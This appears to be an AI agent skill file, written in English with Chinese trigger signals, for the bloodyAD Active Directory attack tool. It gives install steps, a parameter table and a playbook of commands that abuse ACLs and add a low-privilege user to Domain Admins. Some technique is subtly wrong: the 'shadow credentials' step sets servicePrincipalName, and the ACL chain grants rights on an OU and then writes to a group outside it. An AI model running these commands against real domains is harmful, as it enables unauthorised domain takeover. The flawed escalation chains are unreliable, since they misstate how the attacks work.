---
name: bloodyad-ad-privesc
description: "bloodyAD: abuses ACLs for escalation chains, GenericWrite to shadow credentials. Signals: ad attack, domain pentest, read ACL, add delegation/write permissions"
zh-signals: "bloodyAD: ACL 滥用提权链、GenericWrite→影子凭证。信号:ad攻击,域渗透,读 ACL,加委派/写权限。"
when-to-use: >-
  Use during Active Directory pentests to abuse ACLs such as write permissions,
  delegation, and shadow credentials, chaining escalation to domain admin.
---

# bloodyAD

- Attack Category: C30 AD Domain Penetration and Domain Controller Attacks
- Upstream Repository: https://github.com/CravateRouge/bloodyAD
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install bloodyAD
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `-d corp.local -u user -p pass --host dc01 get object 'DC=corp,DC=local' --attr nTSecurityDescriptor` | Read ACL |
| `add dacl ...` | Add delegation/write permissions |
| `set object user accountenabled true` | Enable the account |
| `get child --type User` | List child objects |
| `-k` | Kerberos ticket |
| `--dc-ip 10.0.0.5` | Specify the DC |

## Attack Scenario Playbook

### ACL abuse escalation chain

```bash
bloodyAD -d corp.local -u lowuser -p pass --host dc01 add dacl "OU=IT,DC=corp,DC=local" lowuser WriteMembers
bloodyAD -d corp.local -u lowuser -p pass --host dc01 add groupMember "CN=Domain Admins,CN=Users,DC=corp,DC=local" victim  # writing to the group is privilege escalation
```

### GenericWrite to shadow credentials

```bash
bloodyAD -d corp.local -u user -p pass --host dc01 set object target servicePrincipalName
# then run PKINITtools to obtain the machine account certificate
```

## Notes

Operates on DACLs, attributes, and certificates directly over LDAP; the Swiss army knife of AD privilege escalation, with cleaner syntax than native PowerView.
